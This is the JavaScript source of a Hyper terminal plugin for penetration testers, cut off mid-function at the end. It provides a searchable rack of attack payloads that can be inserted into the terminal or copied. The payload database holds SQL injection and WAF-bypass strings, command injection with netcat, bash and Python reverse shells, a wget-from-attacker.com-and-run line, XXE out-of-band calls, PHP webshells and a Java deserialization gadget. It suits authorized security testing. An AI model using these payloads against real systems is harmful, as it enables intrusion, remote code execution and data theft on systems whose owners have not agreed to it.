'use strict';

// ══════════════════════════════════════════════════════════════
//  HYPER PAYLOAD RACK
//  Searchable payload library for penetration testing
//  Categorized payloads, searchable by keyword, insertable
//  into terminal or clipboard
// ══════════════════════════════════════════════════════════════

const { clipboard } = require('electron');

// ─── Shared Recon Namespace ────────────────────────────────────
function getRecon() {
  if (!window.__hyperRecon) {
    const EventEmitter = require('events');
    window.__hyperRecon = { events: new EventEmitter(), targets: new Map(), findings: [], hud: null };
    window.__hyperRecon.events.setMaxListeners(50);
  }
  return window.__hyperRecon;
}

// ─── Session Tracking ──────────────────────────────────────────
let activeUid = null;

function execInTerminal(cmd) {
  const recon = getRecon();
  const uid = recon.activeUid || activeUid;
  if (!uid) return;
  window.rpc.emit('data', { uid, data: cmd, escaped: false });
}

function copyToClipboard(text) {
  clipboard.writeText(text);
}


// ══════════════════════════════════════════════════════════════
//  PAYLOAD DATABASE
// ══════════════════════════════════════════════════════════════

const PAYLOAD_DB = [
  // ─── 1. SQL Injection ──────────────────────────────────────
  {
    id: 'sqli',
    name: 'SQL Injection',
    icon: '\uD83D\uDDC3',
    color: '#f97316',
    description: 'Classic SQL injection payloads for authentication bypass, UNION-based extraction, blind injection, and command execution.',
    payloads: [
      { text: "' OR '1'='1", tags: ['auth-bypass', 'classic', 'string'], description: 'Classic OR-based auth bypass (no comment)' },
      { text: "' OR '1'='1'--", tags: ['auth-bypass', 'classic', 'comment'], description: 'OR-based auth bypass with SQL comment' },
      { text: "' UNION SELECT NULL,NULL,NULL--", tags: ['union', 'column-count', 'enumeration'], description: 'UNION SELECT to determine column count' },
      { text: "' UNION SELECT username,password FROM users--", tags: ['union', 'data-extraction', 'credentials'], description: 'Extract credentials via UNION injection' },
      { text: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", tags: ['blind', 'time-based', 'sleep', 'mysql'], description: 'Time-based blind SQLi (MySQL SLEEP)' },
      { text: "admin'--", tags: ['auth-bypass', 'admin', 'comment'], description: 'Admin login bypass via comment truncation' },
      { text: "' AND 1=CONVERT(int,(SELECT @@version))--", tags: ['error-based', 'mssql', 'version'], description: 'Error-based SQLi to extract MSSQL version' },
      { text: "1; EXEC xp_cmdshell('whoami')--", tags: ['rce', 'mssql', 'xp_cmdshell', 'command'], description: 'MSSQL command execution via xp_cmdshell' },
      { text: "'; COPY (SELECT '') TO PROGRAM 'wget http://attacker.com/shell.sh -O /tmp/x; bash /tmp/x'--", tags: ['rce', 'postgres', 'copy-program'], description: 'PostgreSQL RCE via COPY FROM PROGRAM' },
      { text: "' UNION SELECT 1, '<?php system($_GET[\"cmd\"]); ?>', 3, 4 INTO OUTFILE '/var/www/html/shell.php'--", tags: ['rce', 'mysql', 'into-outfile', 'webshell'], description: 'MySQL write webshell via INTO OUTFILE' },
    ],
  },

  // ─── 2. SQLi WAF Bypass ────────────────────────────────────
  {
    id: 'sqli-waf',
    name: 'SQLi WAF Bypass',
    icon: '\uD83D\uDEE1',
    color: '#fb923c',
    description: 'SQL injection payloads designed to evade Web Application Firewalls using inline comments, case mixing, and encoding tricks.',
    payloads: [
      { text: "' /*!UNION*/ /*!SELECT*/ 1,2,3--", tags: ['waf', 'mysql', 'inline-comment', 'union'], description: 'MySQL inline comment bypass for UNION SELECT' },
      { text: "' UN/**/ION SEL/**/ECT 1,2,3--", tags: ['waf', 'comment-splitting', 'union'], description: 'Comment-based keyword splitting' },
      { text: "' uNiOn SeLeCt 1,2,3--", tags: ['waf', 'case-mixing', 'union'], description: 'Mixed-case evasion for keyword filters' },
      { text: "'||'1'='1", tags: ['waf', 'concatenation', 'or-bypass'], description: 'String concatenation OR bypass (no spaces)' },
      { text: "' LIKE '1", tags: ['waf', 'like', 'auth-bypass'], description: 'LIKE-based authentication bypass' },
    ],
  },


  // ─── 5. Command Injection ──────────────────────────────────
  {
    id: 'cmdi',
    name: 'Command Injection',
    icon: '\uD83D\uDCBB',
    color: '#22c55e',
    description: 'OS command injection payloads using shell metacharacters, command substitution, and reverse shells.',
    payloads: [
      { text: '; whoami', tags: ['semicolon', 'linux', 'basic'], description: 'Semicolon command separator' },
      { text: '| whoami', tags: ['pipe', 'linux', 'basic'], description: 'Pipe command to whoami' },
      { text: '|| whoami', tags: ['or', 'linux', 'fallback'], description: 'OR operator (runs if first fails)' },
      { text: '&& whoami', tags: ['and', 'linux', 'chain'], description: 'AND operator (runs if first succeeds)' },
      { text: '`whoami`', tags: ['backtick', 'substitution', 'linux'], description: 'Backtick command substitution' },
      { text: '$(whoami)', tags: ['dollar', 'substitution', 'linux'], description: 'Dollar-paren command substitution' },
      { text: '; cat /etc/passwd', tags: ['file-read', 'passwd', 'linux'], description: 'Read passwd file via semicolon injection' },
      { text: '| nc attacker.com 4444 -e /bin/bash', tags: ['reverse-shell', 'netcat', 'linux'], description: 'Netcat reverse shell via pipe' },
      { text: '; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', tags: ['reverse-shell', 'bash', 'linux'], description: 'Bash reverse shell (TCP)' },
      { text: '; python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'', tags: ['reverse-shell', 'python', 'linux'], description: 'Python reverse shell one-liner' },
    ],
  },

  // ─── 6. Command Injection Bypass ───────────────────────────
  {
    id: 'cmdi-bypass',
    name: 'Cmd Injection Bypass',
    icon: '\uD83D\uDD13',
    color: '#4ade80',
    description: 'Command injection payloads that bypass input filters using IFS, backslash insertion, glob patterns, and hex encoding.',
    payloads: [
      { text: 'w${IFS}hoami', tags: ['waf', 'ifs', 'space-bypass'], description: 'IFS variable as space replacement' },
      { text: 'ca\\t /etc/passwd', tags: ['waf', 'backslash', 'keyword-break'], description: 'Backslash-split keyword bypass' },
      { text: '/???/??t /???/p??s??', tags: ['waf', 'glob', 'wildcard', 'obfuscation'], description: 'Glob pattern matching for cat /etc/passwd' },
      { text: "$(printf '\\x63\\x61\\x74') /etc/passwd", tags: ['waf', 'hex-encoding', 'printf'], description: 'Hex-encoded command name via printf' },
    ],
  },

  // ─── 7. Path Traversal ─────────────────────────────────────
  {
    id: 'path-traversal',
    name: 'Path Traversal',
    icon: '\uD83D\uDCC2',
    color: '#06b6d4',
    description: 'Directory traversal payloads using dot-dot-slash sequences, URL encoding, double encoding, and null bytes.',
    payloads: [
      { text: '../../../etc/passwd', tags: ['basic', 'linux', 'passwd'], description: 'Basic relative path traversal' },
      { text: '....//....//....//etc/passwd', tags: ['double-dot', 'filter-bypass', 'linux'], description: 'Double-dot bypass for ../ stripping filters' },
      { text: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', tags: ['url-encoding', 'linux', 'passwd'], description: 'URL-encoded path traversal' },
      { text: '..%252f..%252f..%252fetc/passwd', tags: ['double-encoding', 'linux', 'passwd'], description: 'Double URL-encoded traversal' },
      { text: '../../../etc/passwd%00.jpg', tags: ['null-byte', 'extension-bypass', 'linux'], description: 'Null byte to truncate file extension check' },
      { text: '..\\..\\..\\windows\\win.ini', tags: ['windows', 'backslash', 'win.ini'], description: 'Windows path traversal with backslashes' },
    ],
  },

  // ─── 8. SSRF ───────────────────────────────────────────────
  {
    id: 'ssrf',
    name: 'SSRF',
    icon: '\uD83C\uDF10',
    color: '#8b5cf6',
    description: 'Server-Side Request Forgery payloads targeting localhost, internal services, cloud metadata endpoints, and alternative protocols.',
    payloads: [
      { text: 'http://127.0.0.1', tags: ['localhost', 'loopback', 'basic'], description: 'Standard loopback address' },
      { text: 'http://localhost', tags: ['localhost', 'hostname', 'basic'], description: 'Localhost hostname' },
      { text: 'http://0.0.0.0', tags: ['wildcard', 'zero-address'], description: 'Zero address (all interfaces)' },
      { text: 'http://[::1]', tags: ['ipv6', 'loopback', 'localhost'], description: 'IPv6 loopback address' },
      { text: 'http://169.254.169.254/latest/meta-data/', tags: ['aws', 'metadata', 'cloud', 'imds'], description: 'AWS EC2 instance metadata endpoint' },
      { text: 'http://metadata.google.internal/', tags: ['gcp', 'metadata', 'cloud', 'google'], description: 'GCP metadata endpoint' },
      { text: 'gopher://127.0.0.1:6379/_INFO', tags: ['gopher', 'redis', 'protocol-smuggling'], description: 'Gopher protocol to interact with Redis' },
    ],
  },

  // ─── 9. XXE ────────────────────────────────────────────────
  {
    id: 'xxe',
    name: 'XXE',
    icon: '\uD83D\uDCC4',
    color: '#ec4899',
    description: 'XML External Entity injection payloads for local file read and out-of-band data exfiltration.',
    payloads: [
      {
        text: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        tags: ['file-read', 'classic', 'linux', 'passwd'],
        description: 'XXE local file read (/etc/passwd)',
      },
      {
        text: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
        tags: ['oob', 'ssrf', 'external', 'exfiltration'],
        description: 'XXE out-of-band HTTP request to attacker server',
      },
    ],
  },

  // ─── 10. File Upload ───────────────────────────────────────
  {
    id: 'file-upload',
    name: 'File Upload',
    icon: '\uD83D\uDCE4',
    color: '#f43f5e',
    description: 'Malicious file upload payloads including extension bypasses, polyglot files, and content-type manipulation.',
    payloads: [
      { text: '.php', tags: ['extension', 'php', 'basic'], description: 'Standard PHP extension' },
      { text: '.php5', tags: ['extension', 'php5', 'alternative'], description: 'PHP5 alternative extension' },
      { text: '.phtml', tags: ['extension', 'phtml', 'alternative'], description: 'PHTML alternative extension' },
      { text: '.pht', tags: ['extension', 'pht', 'alternative'], description: 'PHT alternative extension' },
      { text: '.php.jpg', tags: ['extension', 'double-extension', 'bypass'], description: 'Double extension bypass (Apache misconfig)' },
      { text: "GIF89a<?php system($_GET['cmd']); ?>", tags: ['polyglot', 'gif', 'php', 'webshell'], description: 'GIF magic bytes + PHP webshell polyglot' },
      { text: "Content-Type: image/gif\n\n<?php system($_GET['cmd']); ?>", tags: ['content-type', 'bypass', 'mime', 'webshell'], description: 'Content-Type header bypass with PHP webshell' },
    ],
  },

  // ─── Deserialization ──────────────────────────────────────────
  {
    id: 'deserialization',
    name: 'Deserialization',
    icon: '\uD83D\uDCE6',
    color: '#8b5cf6',
    description: 'Payloads for exploiting insecure deserialization in Java, Python, PHP, and Node.js.',
    payloads: [
      { text: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkZbwMAAkwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOg9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYQ0ACAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJ576O51MSOywIAAUwACWlDb25zdGFudHEAfgABeHB2cgABamF2YS5sYW5nLlJ1bnRpbWAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAEltMamF2YS5sYW5nLk9iamVjdDuQzlifEHM8TgIAAHhwAAAAAn0wdAAJZ2V0TWV0aG9kdXIAEltMamF2YS5sYW5nLkNsYXNzO4f1zeX9R0nZAgAAeHAAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAACdAAKZ2V0UnVudGltZXVxAH4AGAAAAAB0AAlnZXRSdW50aW1lc3EAfgATdXEAfgAYAAAAA3BwcHB0AAZpbnZva2V1cQB+ABgAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB0AQRjYWxjdXEAfgAYAAAAAXVxAH4AGAAAAAF0AARleGVjdXEAfgAfDnEAfgAfc3EAfgAPc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAB4eHg=', tags: ['java', 'ysoserial', 'commons-collections'], description: 'Java serialized object (CommonsCollections5) executing "calc"' },
      { text: 'cos\nsystem\n(S\'/bin/sh\'\ntR.', tags: ['python', 'pickle', 'rce'], description: 'Python Pickle RCE payload' },
      { text: 'O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}', tags: ['php', 'object-injection', 'admin'], description: 'PHP Object Injection admin bypass' },
      { text: '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'cat /etc/passwd\', function(error, stdout, stderr) { console.log(stdout) });}()"}', tags: ['nodejs', 'node-serialize', 'rce'], description: 'Node.js node-serialize RCE' },
    ],
  },

  // ─── API Exploitation ─────────────────────────────────────────
  {
    id: 'api-exploitation',
    name: 'API Exploitation',
    icon: '\uD83D\uDD27',
    color: '#0ea5e9',
    description: 'Payloads for testing APIs, including JSON injection, GraphQL introspection, and mass assignment.',
    payloads: [
      { text: '{"$ne": null}', tags: ['nosql', 'mongodb', 'auth-bypass'], description: 'NoSQL Injection (MongoDB) $ne operator' },
      { text: '{"$gt": ""}', tags: ['nosql', 'mongodb', 'auth-bypass'], description: 'NoSQL Injection (MongoDB) $gt operator' },
      { text: '{"email": {"$ne": "1"}, "password": {"$ne": "1"}}', tags: ['nosql', 'mongodb', 'login-bypass'], description: 'MongoDB login bypass with $ne' },
      { text: '{__proto__: {isAdmin: true}}', tags: ['prototype-pollution', 'nodejs', 'json'], description: 'Prototype Pollution to set isAdmin' },
      { text: '{"role": "admin"}', tags: ['mass-assignment', 'json', 'priv-escalation'], description: 'JSON Mass Assignment to admin role' },
      { text: '{"is_admin": true}', tags: ['mass-assignment', 'json', 'priv-escalation'], description: 'JSON Mass Assignment boolean flag' },
      { text: 'query { __schema { types { name fields { name } } } }', tags: ['graphql', 'introspection', 'schema'], description: 'GraphQL Introspection Query' },
    ],
  },

  // ─── 11. Auth Bypass ───────────────────────────────────────
  {
    id: 'auth-bypass',
    name: 'Auth Bypass',
    icon: '\uD83D\uDD11',
    color: '#14b8a6',
    description: 'Authentication and authorization bypass payloads using SQL injection in login forms, and header-based access control bypasses.',
    payloads: [
      { text: "admin' --", tags: ['sqli', 'admin', 'login', 'comment'], description: 'SQL comment to bypass password check' },
      { text: "admin'/*", tags: ['sqli', 'admin', 'login', 'block-comment'], description: 'Block comment to truncate query' },
      { text: 'X-Forwarded-For: 127.0.0.1', tags: ['header', 'ip-spoof', 'whitelist-bypass'], description: 'Spoof client IP to bypass IP whitelisting' },
      { text: 'X-Original-URL: /admin', tags: ['header', 'url-override', 'access-control'], description: 'Override URL to bypass path-based access rules' },
    ],
  },

];

const TOTAL_PAYLOADS = PAYLOAD_DB.reduce((n, c) => n + c.payloads.length, 0);


// ══════════════════════════════════════════════════════════════
//  SEARCH ENGINE
// ══════════════════════════════════════════════════════════════

function searchPayloads(query) {
  const q = query.toLowerCase().trim();
  if (!q) return PAYLOAD_DB;

  const terms = q.split(/\s+/);

  return PAYLOAD_DB.map(cat => {
    const filtered = cat.payloads.filter(p => {
      const haystack = [
        p.text,
        p.description,
        cat.name,
        cat.id,
        ...p.tags,
      ].join(' ').toLowerCase();
      return terms.every(t => haystack.includes(t));
    });
    if (filtered.length === 0) return null;
    return { ...cat, payloads: filtered };
  }).filter(Boolean);
}


// ══════════════════════════════════════════════════════════════
//  PAYLOAD RACK UI COMPONENT (built lazily once React is available)
// ══════════════════════════════════════════════════════════════

let _PanelClass = null;

function getPanelClass(React) {
  if (_PanelClass) return _PanelClass;

  _PanelClass = class PayloadRackUI extends React.Component {
    constructor(props) {
      super(props);
      this.state = {
        searchQuery: '',
        selectedCategory: null,
        copiedIndex: null,
        insertedIndex: null,
        notification: null,
      };
      this._searchRef = null;
      this._notifyTimer = null;
    }

    componentDidMount() {
      if (this._searchRef) {
        setTimeout(() => {
          if (this._searchRef) this._searchRef.focus();
        }, 100);
      }
    }

    componentWillUnmount() {
      if (this._notifyTimer) clearTimeout(this._notifyTimer);
    }

    _notify(msg) {
      if (this._notifyTimer) clearTimeout(this._notifyTimer);
      this.setState({ notification: msg });
      this._notifyTimer = setTimeout(() => {
        this.setState({ notification: null });
        this._notifyTimer = null;
      }, 1500);
    }

    _onCopy(text, idx) {
      copyToClipboard(text);
      this.setState({ copiedIndex: idx });
      this._notify('Copied to clipboard');
      setTimeout(() => this.setState({ copiedIndex: null }), 1200);
    }

    _onInsert(text, idx) {
      execInTerminal(text);
      this.setState({ insertedIndex: idx });
      this._notify('Inserted into terminal');
      setTimeout(() => this.setState({ insertedIndex: null }), 1200);
    }

    render() {
      const { searchQuery, selectedCategory, copiedIndex, insertedIndex, notification } = this.state;
      const h = React.createElement;

      const results = searchPayloads(searchQuery);
      const activeCat = selectedCategory ? results.find(c => c.id === selectedCategory) : null;
      const displayCategories = results;
      const displayPayloads = activeCat ? [activeCat] : results;

      // ── Styles ───────────────────────────────────────────
      const containerStyle = {
        display: 'flex', flexDirection: 'column', height: '100%', position: 'relative',
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
        fontSize: '12px', color: '#c9d1d9', overflow: 'hidden',
      };

      const topBarStyle = {
        display: 'flex', alignItems: 'center', gap: '8px',
        padding: '0 0 8px 0', borderBottom: '1px solid #21262d',
        marginBottom: '6px', flexShrink: 0,
      };

      const searchInputStyle = {
        flex: 1, background: '#161b22', border: '1px solid #30363d',
        borderRadius: '6px', padding: '5px 10px', color: '#c9d1d9',
        fontSize: '12px', outline: 'none', fontFamily: 'inherit',
      };

      const bodyStyle = {
        display: 'flex', flex: 1, overflow: 'hidden', gap: '8px',
      };

      const sidebarStyle = {
        width: '200px', flexShrink: 0, overflowY: 'auto',
        borderRight: '1px solid #21262d', paddingRight: '8px',
      };

      const mainStyle = {
        flex: 1, overflowY: 'auto', paddingLeft: '4px',
      };

      // ── Notification toast ───────────────────────────────
      const notifEl = notification ? h('div', {
        style: {
          position: 'absolute', top: '4px', right: '12px',
          background: '#238636', color: '#fff', padding: '4px 12px',
          borderRadius: '4px', fontSize: '11px', fontWeight: 600,
          zIndex: 100, pointerEvents: 'none',
        },
      }, notification) : null;

      // ── Search bar ───────────────────────────────────────
      const resultCount = displayPayloads.reduce((n, c) => n + c.payloads.length, 0);

      const searchBar = h('div', { style: topBarStyle },
        h('span', {
          style: { fontWeight: 700, color: '#58a6ff', fontSize: '11px', letterSpacing: '0.5px', whiteSpace: 'nowrap' },
        }, '\uD83E\uDDEA PAYLOAD RACK'),
        h('input', {
          type: 'text',
          placeholder: 'Search payloads... (keyword, tag, category)',
          value: searchQuery,
          ref: (el) => { this._searchRef = el; },
          style: searchInputStyle,
          onFocus: (e) => { e.target.style.borderColor = '#58a6ff'; },
          onBlur: (e) => { e.target.style.borderColor = '#30363d'; },
          onChange: (e) => this.setState({ searchQuery: e.target.value }),
          onKeyDown: (e) => {
            e.stopPropagation();
            if (e.key === 'Escape') {
              this.setState({ searchQuery: '' });
              e.target.blur();
            }
          },
        }),
        searchQuery ? h('span', {
          style: { color: '#8b949e', fontSize: '10px', whiteSpace: 'nowrap' },
        }, resultCount + ' results') : null,
        selectedCategory ? h('button', {
          style: {
            background: '#21262d', border: '1px solid #30363d', borderRadius: '4px',
            color: '#8b949e', cursor: 'pointer', padding: '3px 8px',
            fontSize: '10px', whiteSpace: 'nowrap', fontFamily: 'inherit',
          },
          onClick: () => this.setState({ selectedCategory: null }),
          title: 'Show all categories',
        }, 'Show All') : null,
      );

      // ── Sidebar: category list ───────────────────────────
      const catEls = displayCategories.map(cat => {
        const isActive = selectedCategory === cat.id;
        return h('div', {
          key: cat.id,
          style: {
            display: 'flex', alignItems: 'center', gap: '6px',
            padding: '5px 8px', borderRadius: '4px', cursor: 'pointer',
            background: isActive ? '#161b22' : 'transparent',
            borderLeft: isActive ? ('2px solid ' + cat.color) : '2px solid transparent',
            marginBottom: '2px', transition: 'background 0.1s',
          },
          onClick: () => this.setState({ selectedCategory: isActive ? null : cat.id }),
          onMouseEnter: (e) => { if (!isActive) e.currentTarget.style.background = '#161b2288'; },
          onMouseLeave: (e) => { if (!isActive) e.currentTarget.style.background = 'transparent'; },
        },
          h('span', { style: { fontSize: '12px', flexShrink: 0 } }, cat.icon),
          h('span', {
            style: {
              flex: 1, fontSize: '11px',
              color: isActive ? '#f0f6fc' : '#c9d1d9',
              fontWeight: isActive ? 600 : 400,
              whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis',
            },
          }, cat.name),
          h('span', {
            style: {
              background: cat.color + '33', color: cat.color,
              borderRadius: '8px', padding: '0 6px', fontSize: '9px',
              fontWeight: 700, minWidth: '18px', textAlign: 'center', flexShrink: 0,
            },
          }, String(cat.payloads.length)),
        );
      });

      const sidebar = h('div', { style: sidebarStyle },
        h('div', {
          style: {
            fontSize: '10px', color: '#8b949e', fontWeight: 600,
            marginBottom: '6px', textTransform: 'uppercase', letterSpacing: '0.5px',
          },
        }, 'Categories'),
        ...catEls,
      );

      // ── Main: payload list ───────────────────────────────
      const payloadEls = [];
      let runningIdx = 0;

      for (const cat of displayPayloads) {
        // Category header
        payloadEls.push(
          h('div', {
            key: 'hdr-' + cat.id,
            style: {
              display: 'flex', alignItems: 'center', gap: '6px',
              padding: '6px 0 4px 0', borderBottom: '1px solid #21262d',
              marginBottom: '4px',
              marginTop: payloadEls.length > 0 ? '8px' : '0',
            },
          },
            h('span', { style: { fontSize: '12px' } }, cat.icon),
            h('span', {
              style: { fontWeight: 700, color: cat.color, fontSize: '11px', letterSpacing: '0.3px' },
            }, cat.name),
            h('span', {
              style: { fontSize: '10px', color: '#8b949e', marginLeft: '4px' },
            }, '(' + cat.payloads.length + ')'),
            cat.description ? h('span', {
              style: {
                fontSize: '10px', color: '#6e7681', marginLeft: '8px',
                flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap',
              },
            }, cat.description) : null,
          )
        );

        // Individual payloads
        for (const payload of cat.payloads) {
          const idx = runningIdx++;
          const isCopied = copiedIndex === idx;
          const isInserted = insertedIndex === idx;

          const displayText = payload.text.length > 120
            ? payload.text.substring(0, 117) + '...'
            : payload.text;

          payloadEls.push(
            h('div', {
              key: 'p-' + cat.id + '-' + idx,
              style: {
                display: 'flex', alignItems: 'flex-start', gap: '8px',
                padding: '4px 6px', borderRadius: '4px', marginBottom: '2px',
                background: 'transparent', transition: 'background 0.1s',
              },
              onMouseEnter: (e) => { e.currentTarget.style.background = '#161b22'; },
              onMouseLeave: (e) => { e.currentTarget.style.background = 'transparent'; },
            },
              // Payload text + description + tags
              h('div', { style: { flex: 1, minWidth: 0, overflow: 'hidden' } },
                h('code', {
                  style: {
                    display: 'block',
                    fontFamily: '"SF Mono", "Fira Code", "Cascadia Code", monospace',
                    fontSize: '11px', color: '#e6edf3',
                    background: '#0d111788', padding: '3px 6px',
                    borderRadius: '3px', border: '1px solid #21262d',
                    whiteSpace: 'pre', overflow: 'hidden', textOverflow: 'ellipsis',
                    cursor: 'text', userSelect: 'all',
                  },
                  title: payload.text,
                }, displayText),
                h('div', {
                  style: {
                    display: 'flex', alignItems: 'center', gap: '4px',
                    marginTop: '2px', flexWrap: 'wrap',
                  },
                },
                  payload.description ? h('span', {
                    style: { fontSize: '10px', color: '#8b949e', marginRight: '4px' },
                  }, payload.description) : null,
                  ...payload.tags.map(tag =>
                    h('span', {
                      key: tag,
                      style: {
                        fontSize: '9px', color: '#58a6ff',
                        background: '#58a6ff18', padding: '0 4px',
                        borderRadius: '3px', border: '1px solid #58a6ff33',
                        whiteSpace: 'nowrap',
                      },
                    }, tag)
                  ),
                ),
              ),
              // [Insert] and [Copy] buttons
              h('div', {
                style: { display: 'flex', gap: '4px', flexShrink: 0, alignItems: 'center', paddingTop: '2px' },
              },
                h('button', {
                  style: {
                    background: isInserted ? '#238636' : '#21262d',
                    border: '1px solid ' + (isInserted ? '#238636' : '#30363d'),
                    borderRadius: '4px',
                    color: isInserted ? '#fff' : '#c9d1d9',
                    cursor: 'pointer', padding: '3px 8px', fontSize: '10px',
                    fontWeight: 600, fontFamily: 'inherit',
                    whiteSpace: 'nowrap', transition: 'all 0.15s',
                  },
                  title: 'Insert payload into terminal (types it without pressing Enter)',
                  onClick: () => this._onInsert(payload.text, idx),
                  onMouseEnter: (e) => {
                    if (!isInserted) { e.target.style.background = '#30363d'; e.target.style.borderColor = '#58a6ff'; }
                  },
                  onMouseLeave: (e) => {
                    if (!isInserted) { e.target.style.background = '#21262d'; e.target.style.borderColor = '#30363d'; }
                  },
                }, isInserted ? '\u2713 Inserted' : 'Insert'),
                h('button', {
                  style: {
                    background: isCopied ? '#238636' : '#21262d',
                    border: '1px solid ' + (isCopied ? '#238636' : '#30363d'),
                    borderRadius: '4px',
                    color: isCopied ? '#fff' : '#c9d1d9',
                    cursor: 'pointer', padding: '3px 8px', fontSize: '10px',
                    fontWeight: 600, fontFamily: 'inherit',
                    whiteSpace: 'nowrap', transition: 'all 0.15s',
                  },
                  title: 'Copy payload to clipboard',
                  onClick: () => this._onCopy(payload.text, idx),
                  onMouseEnter: (e) => {
                    if (!isCopied) { e.target.style.background = '#30363d'; e.target.style.borderColor = '#58a6ff'; }
                  },
                  onMouseLeave: (e) => {
                    if (!isCopied) { e.target.style.background = '#21262d'; e.target.style.borderColor = '#30363d'; }
                  },
                }, isCopied ? '\u2713 Copied' : 'Copy'),
              ),
            )
          );
        }
      }

      // Empty state when search yields no results
      if (displayPayloads.length === 0) {
        payloadEls.push(
          h('div', {
            key: 'empty',
            style: { textAlign: 'center', padding: '24px', color: '#8b949e' },
          },
            h('div', { style: { fontSize: '20px', marginBottom: '8px' } }, '\uD83D\uDD0D'),
            h('div', { style: { fontSize: '12px' } }, 'No payloads match "' + searchQuery + '"'),
            h('div', { style: { fontSize: '10px', marginTop: '4px', color: '#6e7681' } }, 'Try different keywords or tags'),
          )
        );
      }

      const main = h('div', { style: mainStyle }, ...payloadEls);

      return h('div', { style: containerStyle },
        notifEl,
        searchBar,
        h('div', { style: bodyStyle }, sidebar, main),
      );
    }
  };

  return _PanelClass;
}


// ══════════════════════════════════════════════════════════════
//  PLUGIN EXPORTS
// ══════════════════════════════════════════════════════════════

exports.middleware = (store) => (next) => (action) => {
  switch (action.type) {
    case 'SESSION_SET_ACTIVE':
      activeUid = action.uid;
      break;
    case 'SESSION_ADD':
      if (!activeUid) activeUid = action.uid;
      break;
    case 'SESSION_PTY_EXIT':
    case 'SESSION_USER_EXIT':
      if (action.uid === activeUid) activeUid = null;
      break;
  }
  return next(action);
};


// ─── HUD Tab Registration ──────────────────────────────────────
exports.decorateHyper = (Hyper, { React }) => {
  const PanelComp = getPanelClass(React);

  return class PayloadRackHyper extends React.Component {
    constructor(props) {
      super(props);
      this._registered = false;
      this._onReady = this._onReady.bind(this);
    }

    componentDidMount() {
      this._tryRegister();
    }

    componentDidUpdate() {
      this._tryRegister();
    }

    componentWillUnmount() {
      const recon = getRecon();
      recon.events.removeListener('hud:ready', this._onReady);
    }

    _tryRegister() {
      if (this._registered) return;
      const recon = getRecon();
      if (recon.hud) {
        this._register(recon.hud);
      } else {
        recon.events.removeListener('hud:ready', this._onReady);
        recon.events.on('hud:ready', this._onReady);
      }
    }

    _onReady(hud) {
      if (!this._registered) this._register(hud);
    }

    _register(hud) {
      if (this._registered) return;
      this._registered = true;

      hud.registerTab('payload-rack', 'Payloads', '\uD83E\uDDEA', (React) => {
        return React.createElement(PanelComp, null);
      });
      hud.updateBadge('payload-rack', TOTAL_PAYLOADS);
    }

    render() {
      return React.createElement(Hyper, this.props);
    }
  };
};


// ─── Hotkey: Ctrl+Shift+L to open/focus Payload Rack ───────────
exports.decorateTerm = (Term, { React }) => {
  return class PayloadRackTerm extends React.Component {
    constructor(props) {
      super(props);
      this._keyHandler = this._keyHandler.bind(this);
    }

    componentDidMount() {
      window.addEventListener('keydown', this._keyHandler, true);
    }

    componentWillUnmount() {
      window.removeEventListener('keydown', this._keyHandler, true);
    }

    _keyHandler(e) {
      if (e.ctrlKey && e.shiftKey && e.code === 'KeyL') {
        e.preventDefault();
        e.stopPropagation();
        const recon = getRecon();
        if (recon.hud) {
